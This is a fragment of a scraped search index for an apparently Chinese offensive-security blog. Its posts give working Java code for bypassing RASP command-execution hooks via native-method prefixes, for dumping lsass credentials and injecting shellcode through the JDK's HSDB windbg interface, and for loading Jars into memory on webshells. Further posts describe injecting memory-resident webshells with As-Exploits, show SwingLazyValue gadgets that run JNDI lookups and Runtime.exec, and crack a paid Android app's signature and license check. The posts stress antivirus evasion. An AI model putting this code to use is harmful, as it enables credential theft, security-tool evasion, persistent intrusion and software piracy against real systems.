\u0026\u0026 !m.getName().equals(\"forkAndExec\")) { System.out.println(\"[+] get prefix native method : \" + m.getName()); m.setAccessible(true); int pid = (int) m.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false }); } } } 效果 ","date":"2023-12-28","objectID":"/posts/rasp-nativemethodprefix-bypass/:3:0","series":null,"tags":null,"title":"Bypass RASP NativeMethodPrefix学习","uri":"/posts/rasp-nativemethodprefix-bypass/#兼容无methodprefix场景添加回显"},{"categories":null,"content":"\r4 支持Windows搜了一下发现公开的调用Native绕过的都是Linux平台的，debug看了一下Windows的 Windows反射Native更简单：Windows执行命令对应的Native方法是java.lang.ProcessImpl#create，create方法是个static，不需要实例化对象就可以调用；另外获取回显的文件描述符stdHandles也不像Linux那么多处理分支，可以直接用代码实现，不需要再反射调用。 核心代码： public static String WinCreateProcess(String cmd) throws Exception { Class\u003c?\u003e processImplClass = Class.forName(\"java.lang.ProcessImpl\"); long[] stdHandles = new long[]{-1, -1, -1}; // Initialize as invalid handles. sun.misc.JavaIOFileDescriptorAccess fdAccess = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess(); // 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出 boolean redirectErrorStream = true; try { Method createMethod = processImplClass.getDeclaredMethod(\"create\", String.class, String.class, String.class, long[].class, boolean.class); createMethod.setAccessible(true); long processHandle = (Long) createMethod.invoke(null, cmd, null, null, stdHandles, redirectErrorStream); } catch (Exception e) { System.out.println(\"[-] reflect create failed,try to bypass\"); for (Method m : processImplClass.getDeclaredMethods()) { if (m.getName().endsWith(\"create\") \u0026\u0026 !m.getName().equals(\"create\")) { System.out.println(\"[+] get prefix native method : \" + m.getName()); m.setAccessible(true); long processHandle = (Long) m.invoke(null, cmd, null, null, stdHandles, redirectErrorStream); } } } FileDescriptor stdout_fd = new FileDescriptor(); fdAccess.setHandle(stdout_fd, stdHandles[1]); InputStream stdout_stream = new BufferedInputStream( new FileInputStream(stdout_fd)); return getStreamStr(stdout_stream, \"GBK\"); } 效果 直接执行命令，会被干掉。 运行POC，即可绕过。 ","date":"2023-12-28","objectID":"/posts/rasp-nativemethodprefix-bypass/:4:0","series":null,"tags":null,"title":"Bypass RASP NativeMethodPrefix学习","uri":"/posts/rasp-nativemethodprefix-bypass/#支持windows"},{"categories":null,"content":"\r","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:0:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#"},{"categories":null,"content":"\r1 背景HSDB（Hotspot Debugger)，是JDK自带的调试工具，可用于调试JVM 运行时数据。 最近在学习Beichen师傅《JVM核心对抗》PPT的时候，注意到提到了HSDB的一个玩法：利用其中的windbg调试接口进行dump lsass以及加载Shellcode操作，本文进行学习以及一些武器化利用扩展。 ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:1:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#背景"},{"categories":null,"content":"\r2 dump lsass lsass是windows中处理本地安全和登录策略的重要进程，几乎所有的windows身份认证程序都离不开lsass进程。因此在lsass的内存中会保存用户相关的凭证。它是windows主机中凭证的重要组成部分，因此获取lsass内存也是MITRE ATT\u0026CK框架中Credential Access战术下的重要技术点。 由于许多带签名的正常程序都需要用到内存dump功能，让用户能查看进程在内存中的信息，所以以往的对抗主要是通过一些常见的白进程签名程序，利用程序的正常功能来获取windows lsass中的内存。不过由于用得太多了，基本都已经被各大杀软所监控标记。今天的HSDB属于一个新的小众白名单利用。 核心原理是JVM在调试进程的时候，会调用windbg接口，并且支持输入自定义的windbg语句，从而实现dump lsass 具体代码 public static void dumper(int pid, String path) { WindbgDebuggerLocal debuggerLocal = new WindbgDebuggerLocal(new MachineDescriptionAMD64(), false); debuggerLocal.attach(pid); System.out.println(debuggerLocal.consoleExecuteCommand(\".dump /ma \" + path)); debuggerLocal.detach(); } 打包个jar运行，发现已经成功dump了lsass 然后用mimikatz dump出其中的凭证 VT 0/62 免杀360无告警 为了对比测试，继续跑一下已经公开过的白利用。360告警拦截，dump提示拒绝访问。 ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:2:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#dump-lsass"},{"categories":null,"content":"\r3 加载ShellCodewindbg是一款很强大的调试工具，我们还可以利用该接口进行ShellCode的加载。基本流程： 申请内存 写入Shellcode 修改当前运行指针到Shellcode位置 Beichen师傅的PPT里没有贴写入Shellcode的实现代码，这里其实有很多种方式，我这里采用eb命令实现。其实用Unsafe也可以，但是Unsafe特征比较明显。 核心代码 public static void Runshellcode(int pid, String shellcode) { WindbgDebuggerLocal debuggerLocal = new WindbgDebuggerLocal(new MachineDescriptionAMD64(), false); debuggerLocal.attach(pid); System.out.println(shellcode.length()); String result = debuggerLocal.consoleExecuteCommand(\".dvalloc 10000\"); String addressToken = \"starting at \"; System.out.println(result); int index = result.indexOf(addressToken); String address = result.substring(index + addressToken.length()).trim(); String s1 = debuggerLocal.consoleExecuteCommand(\"eb \" + address + \" \" + hexFormat(shellcode)); System.out.println(s1); String s2 = debuggerLocal.consoleExecuteCommand(\"r @$ip=\" + address); System.out.println(s2); debuggerLocal.detach(); } 同样秒过3xx。 当然这里只是注入方式不被查杀，如果是cs或者msf还要改一下内存特征。 ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:3:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#加载shellcode"},{"categories":null,"content":"\r4 可能遇到的报错必须是JDK下的jre运行才可以，否则可能会产生以下报错 解决办法：复制jdk下的dll到对应目录下 https://blog.csdn.net/fl_zxf/article/details/42689569 ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:4:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#可能遇到的报错"},{"categories":null,"content":"\r5 单文件执行不同版本的sa-jdi可能不一样，如果选择jar方式的话要打包跟目标JDK环境一致的依赖，这样有点麻烦。 除了打一个jar包以外，还可以单文件执行 java -cp \".;c:\\\\xxxxx\\\\sa-jdi.jar\" Exp ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:5:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#单文件执行"},{"categories":null,"content":"\r6 As-Exploits无文件利用想要在WebShell中利用需要满足两点： 加载sa-jdi.jar到ClassLoader 加载调用逻辑 对于第一点，sa-jdi.jar在JDK中默认存在，不需要额外上传，只需要用JarLoader功能加载一下就可以了 第二点，在As-Exploits 1.5中新增了JS引擎执行模块，这里我采用了JS引擎来实现功能的调用。（当然写个Class编译然后再defineClass加载也可以，稍微有点麻烦） 将payload改写为nashorn语法，跑一下看起来没问题 var windbg = Java.type(\"sun.jvm.hotspot.debugger.windbg.WindbgDebuggerLocal\"); var desc = Java.type(\"sun.jvm.hotspot.debugger.MachineDescriptionAMD64\"); var debuggerLocal = new windbg(new desc(), false); debuggerLocal.attach(784); java.lang.System.out.println( debuggerLocal.consoleExecuteCommand(\".dump /ma ./dsds\") ); debuggerLocal.detach(); 具体操作： 到目录界面看，dump文件已经生成了 ","date":"2023-11-10","objectID":"/posts/jvm-hsdb-in-pentest/:6:0","series":null,"tags":null,"title":"JVM HSDB在后渗透中的利用","uri":"/posts/jvm-hsdb-in-pentest/#as-exploits无文件利用"},{"categories":null,"content":"\r","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:0:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#"},{"categories":null,"content":"\r1 更新日志 新增支持jspjs/aspxcsharp类型 除内存马/内存马管理模块以外，均支持Tomcat10 内存马注入模块更新: Filter类型：新增PystingerFilter，SorFilter 新增WebSocket类型：CmdWs，CmdBase64Ws，JSPJSWs，JSPJSBase64Ws 不再支持Servlet内存马 内存马管理模块新增Listener、Tomcat-Value、Timer、Websocket 、Upgrade 、ExecutorShell内存马的查杀检测（thx https://github.com/ruyueattention/java-memshell-scanner） Jar加载器模块内存加载功能BUG修复 ShellCode加载-JNA模块更新，提高兼容性跟稳定性 execPayload模块支持新增额外参数 新增Js引擎执行模块，可用Payload见：https://github.com/yzddmr6/Java-Js-Engine-Payloads aspxcsharp类型支持回显自定义分隔符 aspxcsharp新增SharpLoader模块，支持内存加载、远程加载Assembly；支持获取已加载过的Assembly，无需重复上传；支持传递命令行参数，自动获取输入输出。 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:1:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#更新日志"},{"categories":null,"content":"\r2 兼容Tomcat 10不用多解释 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:2:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#兼容tomcat-10"},{"categories":null,"content":"\r3 新增WebSocket内存马新增4中WebSocket类型内存马：CmdWs，CmdBase64Ws，JSPJSWs，JSPJSBase64Ws 注意Websocket的路径不能填/* 内存马管理模块中可以看到已经注入成功 通过ws协议直接连接 卸载内存马 也可以打入cmd类型，通过Chrome插件手动发送命令 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:3:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#新增websocket内存马"},{"categories":null,"content":"\r4 新增6种内存马检测增加Listener、Tomcat-Value、Timer、Websocket 、Upgrade 、ExecutorShell内存马的查杀检测 核心代码来自：https://github.com/ruyueattention/java-memshell-scanner ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:4:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#新增6种内存马检测"},{"categories":null,"content":"\r5 内存加载ShellCode通过Jar加载器-内存加载，上传ext目录下的loader.jar 可以通过Js引擎执行功能先试一下看类在不在，发现确实可以查找到 ShellCode加载器模块-加载方式JNA，exploit，弹出计算器，也就实现了内存加载ShellCode的功能 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:5:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#内存加载shellcode"},{"categories":null,"content":"\r6 SharpLoader具体实现可以看之前写的文章：https://yzddmr6.com/posts/as-exploits-sharploader/ 以Efspotato为例 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:6:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#sharploader"},{"categories":null,"content":"\r6.1 内存加载选择我们要加载的本地文件即可 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:6:1","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#内存加载"},{"categories":null,"content":"\r6.2 URL加载把exp托管到一个web上，然后填写远程URl地址 需要注意的是，这里有一个坑。 本来想着可以直接去加载github上面各种编译好的payload，但是发现.net 4好像不支持tls1.2 https://stackoverflow.com/questions/47269609/system-net-securityprotocoltype-tls12-definition-not-found 那还是自己搭个http的服务吧 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:6:2","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#url加载"},{"categories":null,"content":"\r6.3 通过名称加载在前面通过内存或者URL加载过的程序集，后续都可以通过项目名来反射加载。 可以先通过 获取已加载的Assembly 功能来获取之前所有打进去过的项目名，多个结果以|分割 填入你想要反射的Assembly的名称，加上要执行的参数，exploit！ 成功调用 参数内空格分割符：{} 例如需要执行 cmd /c ’net user’ 则填写 cmd /c net{}user即可 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:6:3","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#通过名称加载"},{"categories":null,"content":"\r7 联动JMG实现内存马扩展As-Exploits设计理念之一就是要提供良好的扩展性，这里以 执行自定义Payload 功能举例。 虽然插件中内置了一些常见的内存马，但是在实际中我们可能想打入一些别的内存马。这里可以借助pen4uin师傅的JMG项目生成一个蚁剑-Listener内存马 打开JMG，选择内存马类型，中间件类型，设置密码，输出格式选择Base64 生成之后把Payload贴进去，执行 通过内存马管理模块可以看到已经打进去了一个Listener 配置连接的时候别忘了配置敲门的header参数，成功连接 ","date":"2023-10-21","objectID":"/posts/as-exploits-v15-update/:7:0","series":null,"tags":null,"title":"As-Exploits v1.5更新","uri":"/posts/as-exploits-v15-update/#联动jmg实现内存马扩展"},{"categories":null,"content":"\r1 背景最近在捣鼓安卓yuzu模拟器，发现一个问题：JoyCon通过蓝牙连接手机后，两个手柄无法识别为一个设备。电脑上可以用betterjoy解决，安卓上搜了一下据说Joy-Con Enabler这个app可以解决。下载下来发现需要付费才能开启，就研究了一下安卓逆向。 ","date":"2023-10-15","objectID":"/posts/first-android-reverse/:1:0","series":null,"tags":null,"title":"安卓逆向初体验","uri":"/posts/first-android-reverse/#背景"},{"categories":null,"content":"\r2 过程打开app，提示需要升级到PRO版，搜一下关键字 dump出apk，拖到jadx里定位到关键点，还好apk没有加壳，其实也就是看Java代码。可以看到第一个点是会判断hVar.f1655b是否为joycon_enabler_pro这个字符串 安卓逆向不能直接修改Java，需要修改smali字节码，随便搜一个语法教程：https://zhuanlan.zhihu.com/p/580962131，把if-eqz改成if-nez，反转一下逻辑即可绕过。 修改smali有很多种办法，mt管理器比较方便，但是需要买会员，所以后来选了个破解的np管理器，修改后自动签名，安装。 装上后发现不行，提示License校验失败，继续搜索关键字 发现这里jadx报错了，有一个小坑，需要改一下jadx的配置：文件 - 首选项 - 反编译 里面的显示不一致代码 选中 保存退出 然后就可以正常反编译了 发现有一个这样的逻辑： public void a(Context context) { try { if (!context.getPackageManager().getPackageInfo(context.getPackageName(), 64).signatures[0].toCharsString().contentEquals(getResources().getString(R.string.sin))) { this.f502f = false; } } catch (PackageManager.NameNotFoundException unused) { this.f502f = false; } R = true; } 问问GPT，发现是检验包签名，如果发现被篡改就把this.f502f设置为false 搜一下this.f502f这个变量在哪儿被赋值过 都给他强行赋值为true，这里有个坑：f502f是重命名后的结果，f502f的原名称是f，为了防止跟包名冲突 ","date":"2023-10-15","objectID":"/posts/first-android-reverse/:2:0","series":null,"tags":null,"title":"安卓逆向初体验","uri":"/posts/first-android-reverse/#过程"},{"categories":null,"content":"\r3 最后破解完终于可以正常启动了，可惜的是最后他这个软件还是无法使用。。。看了下评论都是在喷他不能用的，还好没有花钱买pro。。。 看了下代码，大概的原理是模拟了一个输入法，通过获取不同的蓝牙指令映射为不同的key。这个apk大概是5-6年前的，猜测可能是随着版本迭代key已经更新，也许更新一下最新的映射或许还能用？这部分就等后面有空了再研究吧。 ","date":"2023-10-15","objectID":"/posts/first-android-reverse/:3:0","series":null,"tags":null,"title":"安卓逆向初体验","uri":"/posts/first-android-reverse/#最后"},{"categories":null,"content":"\r1 背景哥斯拉在第一版的时候就提供了一个黑魔法：内存加载Jar功能。从当时的介绍来看，这个功能本来是为上传数据库驱动用的，后面配合JNA可以实现无文件加载ShellCode，一切都在内存中执行，大大扩展了利用面。 要知道JDK默认没有提供直接内存加载Jar的接口，但是我们可以想到，既然JDK是支持通过http/file协议加载Jar包，也就是这里面一定存在着：读取Jar包内容-\u003e加载到内存-\u003edefineClass的链路，如果我们能够把第一步跳过去，直接把Jar的byte复制到内存中，就可以实现无文件加载。同样，Java原生是不支持内存加载so或者dll的，但是我们可以通过内存加载Jar的方式，在Jar中包含我们要利用的so/dll即可实现曲线救国。 As-Exploits很早就把这个功能移植了过来，不过目前似乎并没有找到有写分析这个功能的文章，本文抛砖引玉，简单分析分析。 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:1:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#背景"},{"categories":null,"content":"\r2 findResource流程分析在了解无文件加载Jar原理之前，首先了解一下JVM是如何查找Class的 Class.forName后下一个断点，进入java.net.URLClassLoader#findClass，这里有一个很重要的属性ucp，包含了所有的URL实例 然后会通过ClassLoader中的ucp属性尝试获取目标类的Resource，这里调用的是sun.misc.URLClassPath#getResource(java.lang.String, boolean)，主要逻辑为遍历ucp下所有的URL对象进行资源的查找：sun.misc.URLClassPath.JarLoader#getResource(java.lang.String, boolean) 找到目标Class对应所在Resource对象后，则会走入java.net.URLClassLoader#defineClass方法，进行类的加载 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:2:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#findresource流程分析"},{"categories":null,"content":"\r3 URLClassPath与URL上面的过程涉及到两个重要的类，直接贴一下ChatGPT的描述： sun.misc.URLClassPath类和java.net.URL类在Java中都与URL（统一资源定位符）相关联，但它们的作用和职责不同。 java.net.URL类是Java标准库中的一个类，用于表示一个统一资源定位符。它提供了许多方法来解析、构建和处理URL。URL对象可以用于打开连接、获取流等操作，以访问网络资源。 sun.misc.URLClassPath类是Java虚拟机（JVM）的一部分，并不属于公共API，它被用于支持类加载器加载和查找类文件。在类的查找过程中，URLClassPath负责管理类加载路径、查找类文件并加载类。 具体来说，当Java程序运行时，JVM的类加载器负责根据类的名称来查找并加载相应的类文件。URLClassPath类是JVM中的一个关键组件，它通过封装一组URL对象（其中包含了可能包含类文件的目录或JAR文件的URL）来提供类的查找功能。URLClassPath通过调用java.net.URL类提供的方法来解析和构建URL对象，并利用这些URL对象来定位和加载类文件。 因此，可以说URLClassPath类是在类加载过程中起着重要的作用，它与java.net.URL类密切合作，使用URL来定位并加载类文件。 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:3:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#urlclasspath与url"},{"categories":null,"content":"\r4 HTTP远程加载Jar包原理知道了findResource的原理，后面就好理解为什么下面的的代码可以远程加载一个Jar包了：实际上就是把我们自定义的远程URL加入到了ucp属性中，后续通过该URL中提供的协议进行类的查找 URLClassLoader loader = new URLClassLoader(new URL[]{new URL(\"http://yzddmr6.com/exp.jar\")}); loader.loadClass(\"asexploits.ShellcodeLoader\"); 为了摸清这一过程，我们用上面的代码对http协议加载Jar包过程进行调试： 在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)断点，发现会根据获取到的协议方式拿到不同的handler，例如http://yzddmr6.com/exp.jar，就会获取http的handler，file:///tmp/exp.jar就会获取file类型的hander java.net.URL#getURLStreamHandler 之前查找到的hander会被保存到handlers整个缓存中，如果没有就会进行一个包名的拼接: “sun.net.www.protocol”+protocol+\".Handler\"，找到对应的处理类 其实这里的协议是可以构造的，例如我们可以设置一种abc://127.0.0.1/exp.jar，就会识别为abc协议 然后在java.net.URL#getURLStreamHandler判断如果handlers里没有缓存，就会尝试去寻找sun.net.www.protocol.abc.Handler这个类，这里handlers属性是一个重点。 除了sun.net.www.protocol.http.Handler以外，默认的JDK还支持以下协议，可以看看： 后续就会依次经过以下步骤， java.net.URL#openConnection java.net.URL#openStream sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL) 在sun.net.www.protocol.http.Handler#openConnection(java.net.URL, java.net.Proxy)中会返回一个新的HttpURLConnection对象，该对象主要负责具体对远程地址的请求，获取Jar的内容。 可以看到在http协议加载Jar过程中有两个重要的类： sun.net.www.protocol.http.HttpURLConnection sun.net.www.protocol.http.Handler 这两个类都与HTTP协议相关，在Java中用于处理HTTP连接和请求： sun.net.www.protocol.http.HttpURLConnection类是Java标准库中的一个类，它继承自java.net.HttpURLConnection类，用于创建HTTP连接并发送HTTP请求。它提供了一组方法来设置请求的参数、发送请求、获取响应等操作，使开发者可以通过该类与远程服务器进行HTTP通信。 sun.net.www.protocol.http.Handler类是Java虚拟机（JVM）中的一个实现类，它实现了java.net.URLStreamHandler接口。URLStreamHandler接口定义了处理不同URL协议的方法，而sun.net.www.protocol.http.Handler类具体处理HTTP协议。它负责解析并处理URL对象中的HTTP部分，包括建立HTTP连接、发送HTTP请求等操作，这些操作实际是由HttpURLConnection来实现。 这两个类是获取Jar包内容的核心所在，想要实现内存加载Jar的关键部分就在这里。 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:4:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#http远程加载jar包原理"},{"categories":null,"content":"\r5 内存加载Jar原理综合看下来，最简单的办法就是实现一套自定义一套协议，在http协议的基础上修改获取Jar的逻辑，这也是beichen师傅的做法 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#内存加载jar原理"},{"categories":null,"content":"\r5.1 增加自定义protocol在哥斯拉中叫jarmembuff，在这里我们直接把协议跟对应的handler塞到URL对象的handlers缓存中，核心代码： Field declaredField = null; files = new ArrayList(); try { declaredField = URL.class.getDeclaredField(\"handlers\"); } catch (NoSuchFieldException var7) { try { declaredField = URL.class.getDeclaredField(\"ph_cache\"); } catch (NoSuchFieldException var5) { } catch (Exception var6) { } } declaredField.setAccessible(true); Map map = (Map) declaredField.get(null); synchronized (map) { Object memoryBufferURLStreamHandler; if (map.containsKey(\"jarmembuff\")) { memoryBufferURLStreamHandler = map.get(\"jarmembuff\"); } else { memoryBufferURLStreamHandler = new MemoryBufferURLStreamHandler(); map.put(\"jarmembuff\", memoryBufferURLStreamHandler); } files = (List) memoryBufferURLStreamHandler.getClass().getMethod(\"getFiles\").invoke(memoryBufferURLStreamHandler); } ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:1","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#增加自定义protocol"},{"categories":null,"content":"\r5.2 实现自定义URLStreamHandlerMemoryBufferURLStreamHandler中openConnection直接返回自定义的URLConnection类，用于获取Jar的内容 import java.io.IOException; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.ArrayList; import java.util.List; public class MemoryBufferURLStreamHandler extends URLStreamHandler { private final List files = new ArrayList(); public MemoryBufferURLStreamHandler() { } public List getFiles() { return this.files; } public URLConnection openConnection(URL url) throws IOException { return new MemoryBufferURLConnection(url); } } ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:2","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#实现自定义urlstreamhandler"},{"categories":null,"content":"\r5.3 实现自定义URLConnectionMemoryBufferURLConnection，在getInputStream方法中直接返回要加载Jar包的byte数组，该数组内容可以自定义传入，即内存加载 import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Field; import java.net.MalformedURLException; import java.net.URL; import java.net.URLConnection; import java.util.ArrayList; import java.util.List; import java.util.Map; public class MemoryBufferURLConnection extends URLConnection { private static List files; private final String contentType; private final byte[] data; protected MemoryBufferURLConnection(URL url) { super(url); String file = url.getFile(); int indexOf = file.indexOf(47); synchronized (files) { this.data = (byte[]) files.get(Integer.parseInt(file.substring(0, indexOf))); } this.contentType = file.substring(indexOf + 1); } public static URL createURL(byte[] bArr, String str) throws MalformedURLException { synchronized (files) { files.add(bArr); URL url = new URL(\"jarmembuff\", \"\", files.size() - 1 + \"/\" + str); return url; } } public void connect() throws IOException { } public int getContentLength() { return this.data.length; } public String getContentType() { return this.contentType; } public InputStream getInputStream() throws IOException { return new ByteArrayInputStream(this.data); // 直接返回内存中的内容 } } ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:3","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#实现自定义urlconnection"},{"categories":null,"content":"\r5.4 添加到SystemClassLoader的ucp中调用时首先将两个类打入内存上下文，然后调用MemoryBufferURLConnection的createURL创建构造好的URL对象，最后通过反射塞到SystemClassLoader的ucp中 public String load(byte[] jarClassData) { Class URLConnectionClass = null; try { String MemoryBufferURLConnection = \"\"; String MemoryBufferURLStreamHandler = \"\"; defClz(Base64DecodeToByte(MemoryBufferURLStreamHandler)); URLConnectionClass = defClz(Base64DecodeToByte(MemoryBufferURLConnection)); } catch (Exception e) { } if (jarClassData != null) { try { return addJar((URL) URLConnectionClass.getMethod(\"createURL\", byte[].class, String.class).invoke(null, jarClassData, \"application/jar\")); } catch (Exception e) { return e.getMessage(); } } else { return \"jarByteArray is null\"; } } ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:4","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#添加到systemclassloader的ucp中"},{"categories":null,"content":"\r5.5 files对象这里哥斯拉有一个小细节，MemoryBufferURLStreamHandler中有一个没有使用过的files对象，研究了一下是什么作用 其实是因为MemoryBufferURLConnection每次是new出来的，无法保存之前加载过的Jar内容，这里的List是一个浅拷贝，链接到MemoryBufferURLStreamHandler实例对象中，这样就可以在每次new之后依旧保留曾经加载过的jar，不需要重复加载。 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:5:5","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#files对象"},{"categories":null,"content":"\r6 适配高版本JDKJDK9实现了模块化，SystemClassLoader不再是URLClassLoader的子类，所以原有的Poc就不能直接用了。520师傅后来进行了一系列改进，支持了高版本JDK。其实基本原理差不多，主要是用https://github.com/BeichenDream/Kcon2021Code中的trick绕过JDK了模块保护和反射过滤 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:6:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#适配高版本jdk"},{"categories":null,"content":"\r7 As-Exploits内存加载ShellCode通过Jar加载器-内存加载，上传ext目录下的loader.jar 可以通过Js引擎执行功能先试一下看类在不在，发现确实可以查找到 ShellCode加载器模块-加载方式JNA，exploit，弹出计算器，也就实现了内存加载ShellCode的功能 ","date":"2023-10-09","objectID":"/posts/memory-jarloader/:7:0","series":null,"tags":null,"title":"分析哥斯拉内存加载Jar技术","uri":"/posts/memory-jarloader/#as-exploits内存加载shellcode"},{"categories":null,"content":"SwingLazyValue在WebShell下的利用","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/"},{"categories":null,"content":"\r1 背景在Hessian相关的反序列化场景下经常会看到这个链子，本文列举分析一些常见的利用，并且融入到WebShell场景。 UIDefaults.get UIDefaults.getFromHashTable UIDefaults$LazyValue.createValue SwingLazyValue.createValue ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:1:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#背景"},{"categories":null,"content":"\r2 原理SwingLazyValue.createValue可以实现一个任意方法的反射，相当于一个反射的包装类。 限制：var2是个Class，不是实例化后的Object对象，所以只能调用静态方法来实现gadgets，因为反射调用静态方法的时候第一个参数可以随便填。 ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:2:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#原理"},{"categories":null,"content":"\r3 利用","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用"},{"categories":null,"content":"\r3.1 利用一：JNDI注入invoke一个任意静态函数，比较容易想到JNDI注入InitialContext.doLookup() javax.swing.UIDefaults#get sun.swing.SwingLazyValue#createValue javax.naming.InitialContext#doLookup \u003c%@ page import=\"javax.swing.*\" %\u003e \u003c% Object o = new sun.swing.SwingLazyValue(\"javax.naming.InitialContext\", \"doLookup\", new Object[]{\"ldap://xxxx\"}); UIDefaults uiDefaults = new UIDefaults(); uiDefaults.put(\"aaa\", o); uiDefaults.get(\"aaa\"); %\u003e 起个恶意的ldap即可利用，但是有版本限制，并且需要出网 ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:1","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用一jndi注入"},{"categories":null,"content":"\r3.2 利用二：套娃反射执行命令这个操作其实比较秀了，刚才提到var2只能是一个Class，只能调用一个静态方法，而MethodUtil.invoke就刚好是一个符合条件的利用点，所以我们可以通过套娃反射一个MethodUtil.invoke，将真正想要调用的类方法放到其参数中来突破这一限制。 \u003c%@ page import=\"sun.reflect.misc.MethodUtil\" %\u003e \u003c%@ page import=\"java.lang.reflect.Method\" %\u003e \u003c%@ page import=\"sun.swing.SwingLazyValue\" %\u003e \u003c%@ page import=\"javax.swing.*\" %\u003e \u003c% Method invoke = MethodUtil.class.getMethod(\"invoke\", Method.class, Object.class, Object[].class); Method exec = Runtime.class.getMethod(\"exec\", String[].class); String[] command = new String[]{\"sh\", \"-c\", \"open /\"}; SwingLazyValue swingLazyValue = new SwingLazyValue(\"sun.reflect.misc.MethodUtil\", \"invoke\", new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}}); UIDefaults u1 = new UIDefaults(); u1.put(\"key\", swingLazyValue); u1.get(\"key\"); %\u003e exec:485, Runtime (java.lang) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) 